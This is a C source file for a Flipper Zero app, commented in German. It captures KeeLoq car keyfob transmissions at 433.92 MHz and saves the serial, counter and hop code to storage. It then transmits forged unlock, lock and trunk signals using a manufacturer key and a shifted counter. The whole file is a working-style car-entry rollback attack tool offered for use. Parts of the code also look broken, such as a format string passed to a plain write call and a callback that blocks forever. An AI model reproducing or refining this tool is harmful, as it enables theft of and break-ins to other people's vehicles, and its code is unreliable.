// applications_user/stealth_rollback/stealth_rollback.c
// STEALTH Shyan Rollback + PERSISTENT SAVE
// Speichert Crack auf SD - unlimited reuse!

#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <input/input.h>
#include <notification/notification_messages.h>
#include <storage/storage.h>
#include <stream_buffer.h>
#include <subghz/subghz.h>
#include <subghz/protocols/keeloq.h>
#include <toolbox/path.h>

#define SAVE_PATH INT_PATH("stealth_car.sub")
#define SAVE_FOLDER EXT_PATH("subghz/stealth/")

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    NotificationApp* notifications;
    SubGhz* subghz;
    FuriString* status;
    Storage* storage;
    
    // Crack Data
    uint32_t serial;
    uint32_t counter;
    uint8_t manu;
    uint64_t hop;
    bool captured;
    bool cracked;
    bool loaded;
    
    FuriTimer* timer;
} StealthApp;

// SAVE/LOAD Crack File (.sub Format)
static bool save_crack(StealthApp* app) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    
    furi_string_cat_printf(app->status, "%s", SAVE_PATH);
    if(!storage_file_open(file, furi_string_get_cstr(app->status), FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);
        return false;
    }
    
    // Flipper .sub Header + Crack Data
    storage_file_write_string(file,
        "Filetype: Flipper SubGhz Key File\n"
        "Version: 1\n"
        "Frequency: 433920000\n"
        "Preset: FuriHalSubGhzPresetGFSK9_99KbAsync\n"
        "Protocol: KeeLoq\n"
        "Bit: 64\n"
        "Key: %02X%02X%02X%02X%02X%02X%02X%02X\n"
        "Manufacture: %u\n"
        "Cnt: %04X\n"
        "Serial: %06X\n"
        "Hop: %016llX\n",
        ((uint8_t*)&app->hop)[0], ((uint8_t*)&app->hop)[1], ((uint8_t*)&app->hop)[2], ((uint8_t*)&app->hop)[3],
        ((uint8_t*)&app->hop)[4], ((uint8_t*)&app->hop)[5], ((uint8_t*)&app->hop)[6], ((uint8_t*)&app->hop)[7],
        app->manu, app->counter, app->serial, app->hop
    );
    
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    
    furi_string_set(app->status, "Saved: stealth_car.sub");
    return true;
}

static bool load_crack(StealthApp* app) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    
    if(!storage_file_open(file, SAVE_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);
        return false;
    }
    
    // Parse .sub File (simplified)
    char line[128];
    while(storage_file_read_line(file, line, sizeof(line))) {
        if(strncmp(line, "Serial:", 7) == 0) app->serial = strtoul(line + 7, NULL, 16);
        else if(strncmp(line, "Cnt:", 4) == 0) app->counter = strtoul(line + 4, NULL, 16);
        else if(strncmp(line, "Manufacture:", 12) == 0) app->manu = atoi(line + 12);
        else if(strncmp(line, "Hop:", 4) == 0) app->hop = strtoull(line + 4, NULL, 16);
    }
    
    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    
    app->loaded = true;
    app->cracked = true;
    furi_string_printf(app->status, "Loaded Serial:%06X", app->serial);
    return true;
}

static void render_callback(Canvas* canvas, void* ctx) {
    StealthApp* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontSecondary);
    
    canvas_draw_str(canvas, 2, 12, "STEALTH ROLLBACK v2");
    
    if(app->loaded || app->cracked) {
        canvas_draw_str(canvas, 2, 25, "CRACKED! (Saved)");
        furi_string_printf(app->status, "S:%06X C:%04X", app->serial, app->counter);
        canvas_draw_str(canvas, 2, 38, furi_string_get_cstr(app->status));
        canvas_draw_str(canvas, 2, 52, "UP=Unlock DOWN=Lock");
        canvas_draw_str(canvas, 2, 65, "L=Load S=Save");
    } else if(app->captured) {
        canvas_draw_str(canvas, 10, 35, "Captured! Saving..");
        furi_string_printf(app->status, "Serial:%06X", app->serial);
        canvas_draw_str(canvas, 10, 48, furi_string_get_cstr(app->status));
    } else {
        canvas_draw_str(canvas, 15, 40, "LISTENING...");
        canvas_draw_str(canvas, 5, 55, "Keyfob press -> SAVE");
    }
}

static void rx_callback(SubGhzReceiver* receiver, SubGhzProtocolDecoderBase* decoder, void* context) {
    StealthApp* app = context;
    if(app->captured || strcmp(decoder->protocol->name, "KeeLoq") != 0) return;
    
    SubGhzProtocolDecoderKeeloqData* data = subghz_protocol_decoder_keeloq_get_data((SubGhzProtocolDecoderKeeloq*)decoder);
    app->serial = data->serial;
    app->counter = data->cnt;
    app->manu = data->manufacture_name;
    app->hop = data->hop;
    app->captured = true;
    
    // Auto-save nach Capture
    furi_thread_flags_wait(0, FuriFlagWaitForever);
}

static void stealth_tx(StealthApp* app, uint8_t btn, int32_t cnt_offset) {
    if(!app->cracked && !app->loaded) return;
    
    uint32_t target_cnt = app->counter + cnt_offset;
    if(target_cnt < app->counter - 32 || target_cnt > app->counter + 8) return;  // Safe window
    
    SubGhzProtocolEncoderKeeloq* enc = subghz_protocol_keeloq_encoder_alloc();
    uint64_t manu_key = subghz_protocol_keeloq_common_get_manufacturer_key(app->manu);
    
    subghz_protocol_keeloq_encoder_set_key(enc, manu_key);
    subghz_protocol_keeloq_encoder_set_serial(enc, app->serial);
    subghz_protocol_keeloq_encoder_set_btn(enc, btn);
    subghz_protocol_keeloq_encoder_set_counter(enc, target_cnt);
    
    furi_hal_subghz_reset();
    furi_hal_subghz_load_preset(FuriHalSubGhzPresetGFSK9_99KbAsync);
    furi_hal_subghz_set_frequency_and_path(433920000);
    
    subghz_protocol_encoder_keeloq_encode(enc);
    furi_hal_subghz_tx();
    furi_delay_ms(25);
    furi_hal_subghz_sleep();
    
    subghz_protocol_encoder_keeloq_free(enc);
}

static bool input_callback(InputEvent* event, void* ctx) {
    StealthApp* app = ctx;
    if(event->type != InputTypeShort) return false;
    
    switch(event->key) {
    case InputKeyUp:     // Unlock
        stealth_tx(app, 1, 1);
        break;
    case InputKeyDown:   // Lock  
        stealth_tx(app, 0, 1);
        break;
    case InputKeyLeft:   // Trunk
        stealth_tx(app, 2, 0);
        break;
    case InputKeyOk:
        if(app->captured) {
            save_crack(app);
            app->cracked = true;
        }
        break;
    case InputKeyBack:   // Load saved
        if(load_crack(app)) {
            furi_string_set(app->status, "Loaded from SD!");
        }
        break;
    default:
        break;
    }
    return true;
}

int32_t stealth_rollback_app(void* p) {
    UNUSED(p);
    
    StealthApp* app = malloc(sizeof(StealthApp));
    app->status = furi_string_alloc();
    app->notifications = furi_record_open(RECORD_NOTIFICATION_APP);
    app->storage = furi_record_open(RECORD_STORAGE);
    
    app->subghz = subghz_alloc();
    subghz_begin(app->subghz, SUBGHZ_APP_FOLDER);
    subghz_receiver_set_rx_callback(app->subghz->receiver, rx_callback, app);
    
    // GUI Setup
    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    
    View* view = view_alloc();
    view_set_context(view, app);
    view_set_draw_callback(view, render_callback);
    view_set_input_callback(view, input_callback);
    
    view_dispatcher_add_view(app->view_dispatcher, 0, view);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    
    // Auto-load check
    if(load_crack(app)) {
        app->cracked = true;
        furi_string_set(app->status, "Auto-loaded!");
    }
    
    view_dispatcher_switch_to_view(app->view_dispatcher, 0);
    view_dispatcher_run(app->view_dispatcher);
    
    // Cleanup
    view_dispatcher_free(app->view_dispatcher);
    furi_string_free(app->status);
    subghz_free(app->subghz);
    free(app);
    
    return 0;
}